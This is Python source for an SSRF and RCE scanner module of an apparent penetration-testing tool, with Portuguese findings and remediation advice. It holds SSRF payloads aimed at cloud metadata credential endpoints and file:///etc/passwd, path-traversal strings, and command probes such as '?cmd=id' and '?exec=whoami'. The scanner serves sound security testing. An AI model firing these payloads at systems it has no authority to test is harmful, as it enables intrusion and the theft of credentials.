"""
HackerPA Engine - SSRF & RCE Validation Scanner

Tests for Server-Side Request Forgery (SSRF) by attempting to make the
target server fetch internal resources or callback URLs. Also checks for
Remote Code Execution (RCE) indicators in error responses.

Non-destructive: uses only read operations and timing analysis.
"""

import re
import time
from urllib.parse import urljoin, urlencode, urlparse, parse_qs, urlunparse

from bs4 import BeautifulSoup

from engine.scanners.base_scanner import BaseScanner


# Internal IPs/URLs to test SSRF against
SSRF_PAYLOADS = [
    # Localhost variants
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    # Bypass attempts
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:3000",
    # Cloud metadata endpoints (read-only)
    "http://169.254.169.254/latest/meta-data/",          # AWS
    "http://metadata.google.internal/computeMetadata/v1/", # GCP
    "http://169.254.169.254/metadata/instance",            # Azure
    # URL schema tricks
    "http://2130706433",               # 127.0.0.1 as decimal
    "http://0x7f000001",               # 127.0.0.1 as hex
    "http://017700000001",             # 127.0.0.1 as octal
    "http://127.1",                    # Short form
    # File protocol (if supported)
    "file:///etc/passwd",
    "file:///c:/windows/system.ini",
]

# Parameters commonly vulnerable to SSRF
SSRF_PARAM_NAMES = [
    "url", "uri", "link", "src", "source", "href", "path", "file",
    "page", "document", "folder", "root", "dir", "site", "host",
    "redirect", "redirect_url", "return", "return_url", "callback",
    "next", "target", "dest", "destination", "domain", "feed",
    "proxy", "api", "endpoint", "fetch", "load", "read", "download",
    "image", "img", "icon", "logo", "avatar", "photo", "picture",
    "pdf", "template", "preview", "view", "ref", "reference",
]

# RCE indicators in responses
RCE_INDICATORS = [
    # Linux passwd file
    r"root:x?:0:0:",
    # Windows system.ini
    r"\[drivers\]",
    r"\[extensions\]",
    # Command output patterns
    r"uid=\d+\([\w-]+\)\s+gid=\d+",  # id command output
    r"(?:Linux|Darwin|Windows)\s+\S+\s+\d+",  # uname output
    # Cloud metadata
    r"ami-[a-f0-9]+",                # AWS AMI ID
    r"instance-id",                   # Cloud instance
    r"iam/security-credentials",      # AWS IAM
    # Error messages indicating SSRF potential
    r"Connection refused.*127\.0\.0\.1",
    r"Connection refused.*localhost",
    r"couldn't connect to host",
    r"getaddrinfo.*failed",
]

# Patterns indicating server tried to fetch the URL (even if blocked)
SSRF_EVIDENCE_PATTERNS = [
    r"Connection refused",
    r"Connection timed out",
    r"No route to host",
    r"Name or service not known",
    r"getaddrinfo",
    r"curl_exec",
    r"file_get_contents",
    r"fopen\(",
    r"java\.net\.ConnectException",
    r"java\.net\.UnknownHostException",
    r"urllib",
    r"requests\.exceptions",
    r"ECONNREFUSED",
    r"ETIMEDOUT",
]


class SSRFScanner(BaseScanner):
    scanner_name = "ssrf_scanner"

    def run(self) -> None:
        self.log("info", f"Testing SSRF/RCE for {self.base_url}")

        # 1. Find URL parameters in the target
        response = self.make_request(self.base_url)
        if response is None:
            self.log("error", f"Could not reach {self.base_url}")
            return

        # 2. Find forms and links with URL-like parameters
        injectable_points = self._find_injectable_points(response.text)
        self.log("info", f"Found {len(injectable_points)} potential SSRF injection points")

        # 3. Test each point
        for point in injectable_points:
            self._test_ssrf(point)

        # 4. Test common API patterns for SSRF
        self._test_common_ssrf_endpoints()

        # 5. Check for RCE indicators in error pages
        self._check_rce_indicators()

        self.log("info", "SSRF/RCE scan complete")

    def _find_injectable_points(self, html: str) -> list[dict]:
        """Find URL parameters that might be vulnerable to SSRF."""
        points = []
        try:
            soup = BeautifulSoup(html, "lxml")

            # Check all links for URL-like parameters
            for tag in soup.find_all(["a", "form", "img", "iframe", "script"]):
                url = tag.get("href") or tag.get("action") or tag.get("src") or ""
                if not url or url.startswith("#") or url.startswith("javascript:"):
                    continue

                full_url = urljoin(self.base_url, url)
                parsed = urlparse(full_url)

                # Only test same-origin URLs
                base_parsed = urlparse(self.base_url)
                if parsed.hostname != base_parsed.hostname:
                    continue

                params = parse_qs(parsed.query)
                for param_name in params:
                    if param_name.lower() in SSRF_PARAM_NAMES:
                        points.append({
                            "url": full_url,
                            "param": param_name,
                            "method": "GET",
                        })

            # Check forms with URL-like input fields
            for form in soup.find_all("form"):
                action = urljoin(self.base_url, form.get("action", ""))
                method = (form.get("method", "GET")).upper()

                for inp in form.find_all(["input", "textarea"]):
                    name = inp.get("name", "")
                    if name.lower() in SSRF_PARAM_NAMES:
                        points.append({
                            "url": action,
                            "param": name,
                            "method": method,
                        })

        except Exception as e:
            self.log("warning", f"Error parsing HTML for SSRF points: {e}")

        return points

    def _test_ssrf(self, point: dict) -> None:
        """Test a single injection point for SSRF."""
        url = point["url"]
        param = point["param"]
        method = point["method"]

        # Test a subset of payloads to avoid excessive requests
        test_payloads = SSRF_PAYLOADS[:8]

        for payload in test_payloads:
            if method == "GET":
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                response = self.make_request(test_url)
            else:
                data = {param: payload}
                response = self.make_request(url, method="POST", data=data)

            if response is None:
                continue

            body = response.text

            # Check for RCE indicators (actual file contents leaked)
            for pattern in RCE_INDICATORS:
                if re.search(pattern, body, re.IGNORECASE):
                    self.add_finding(
                        severity="critical",
                        title=f"SSRF confirmado com possivel RCE via parametro '{param}'",
                        description=(
                            f"O servidor processou uma URL interna/maliciosa fornecida no parametro '{param}'. "
                            f"O conteudo da resposta indica que o servidor executou a requisicao, "
                            f"podendo expor arquivos internos, metadados de cloud, ou permitir execucao de comandos."
                        ),
                        evidence={
                            "url": url,
                            "payload": f"{param}={payload}",
                            "response_snippet": body[:300],
                        },
                        remediation=(
                            "1. NUNCA use input do usuario diretamente em requisicoes server-side.\n"
                            "2. Implemente uma allowlist de dominios/IPs permitidos.\n"
                            "3. Bloqueie requisicoes para IPs privados (127.0.0.1, 10.x, 172.16.x, 192.168.x).\n"
                            "4. Bloqueie requisicoes para metadados de cloud (169.254.169.254).\n"
                            "5. Use uma biblioteca de validacao de URL que rejeite esquemas perigosos (file://, gopher://)."
                        ),
                        owasp_category="A10:2021 - Server-Side Request Forgery",
                        cvss_score=9.8,
                        affected_url=url,
                    )
                    return  # Critical found, no need to test more

            # Check for evidence that server TRIED to fetch (even if blocked)
            for pattern in SSRF_EVIDENCE_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    self.add_finding(
                        severity="high",
                        title=f"Possivel SSRF via parametro '{param}'",
                        description=(
                            f"O servidor parece ter tentado fazer uma requisicao para a URL fornecida no parametro '{param}'. "
                            f"A mensagem de erro indica que o servidor processou a URL internamente. "
                            f"Com payloads mais elaborados, isso pode levar a acesso a recursos internos."
                        ),
                        evidence={
                            "url": url,
                            "payload": f"{param}={payload}",
                            "response_snippet": body[:300],
                        },
                        remediation=(
                            "1. Valide e sanitize todas as URLs fornecidas pelo usuario.\n"
                            "2. Use allowlists de dominios permitidos.\n"
                            "3. Nao exponha mensagens de erro internas ao usuario."
                        ),
                        owasp_category="A10:2021 - Server-Side Request Forgery",
                        cvss_score=7.5,
                        affected_url=url,
                    )
                    return

    def _test_common_ssrf_endpoints(self) -> None:
        """Test common API endpoints that often accept URL parameters."""
        common_paths = [
            "/api/proxy?url=",
            "/api/fetch?url=",
            "/api/preview?url=",
            "/api/screenshot?url=",
            "/api/pdf?url=",
            "/api/image?url=",
            "/api/import?url=",
            "/api/webhook?url=",
            "/proxy?url=",
            "/fetch?url=",
            "/redirect?url=",
            "/load?url=",
        ]

        test_payload = "http://127.0.0.1:80"

        for path in common_paths:
            url = urljoin(self.base_url.rstrip("/"), path + test_payload)
            response = self.make_request(url, timeout=10)

            if response is None:
                continue

            # Skip 404s
            if response.status_code == 404:
                continue

            body = response.text
            # Check if server processed the internal URL
            for pattern in RCE_INDICATORS + SSRF_EVIDENCE_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    self.add_finding(
                        severity="high",
                        title=f"Endpoint de proxy/fetch vulneravel a SSRF: {path.split('?')[0]}",
                        description=(
                            f"O endpoint '{path.split('?')[0]}' aceita URLs e tenta busca-las server-side. "
                            f"Isso pode ser explorado para acessar recursos internos da rede."
                        ),
                        evidence={
                            "url": url,
                            "payload": test_payload,
                            "response_snippet": body[:300],
                        },
                        remediation=(
                            "1. Remova endpoints de proxy desnecessarios.\n"
                            "2. Se necessario, implemente allowlist rigorosa de dominios.\n"
                            "3. Bloqueie IPs privados e de metadados de cloud."
                        ),
                        owasp_category="A10:2021 - Server-Side Request Forgery",
                        cvss_score=8.0,
                        affected_url=url,
                    )
                    break

    def _check_rce_indicators(self) -> None:
        """Check error pages for indicators of command execution or path traversal."""
        rce_paths = [
            "/..%2f..%2f..%2f..%2fetc/passwd",
            "/..%252f..%252f..%252fetc/passwd",
            "/?cmd=id",
            "/?exec=whoami",
            "/?command=uname+-a",
            "/cgi-bin/test.cgi",
            "/debug/vars",
            "/actuator/env",
        ]

        for path in rce_paths:
            url = urljoin(self.base_url.rstrip("/"), path)
            response = self.make_request(url, timeout=10)

            if response is None or response.status_code == 404:
                continue

            body = response.text

            for pattern in RCE_INDICATORS:
                if re.search(pattern, body, re.IGNORECASE):
                    self.add_finding(
                        severity="critical",
                        title="Possivel Remote Code Execution (RCE) detectado",
                        description=(
                            f"O endpoint '{path}' retornou conteudo que indica execucao de comandos "
                            f"ou acesso a arquivos do sistema. Isso e uma vulnerabilidade critica que "
                            f"permite controle total do servidor."
                        ),
                        evidence={
                            "url": url,
                            "payload": path,
                            "response_snippet": body[:300],
                        },
                        remediation=(
                            "1. URGENTE: Desabilite qualquer endpoint que execute comandos do sistema.\n"
                            "2. Nunca passe input do usuario para funcoes como exec(), system(), eval().\n"
                            "3. Remova CGI scripts desnecessarios.\n"
                            "4. Desabilite debug endpoints em producao.\n"
                            "5. Atualize o framework para a versao mais recente."
                        ),
                        owasp_category="A03:2021 - Injection",
                        cvss_score=10.0,
                        affected_url=url,
                    )
                    return
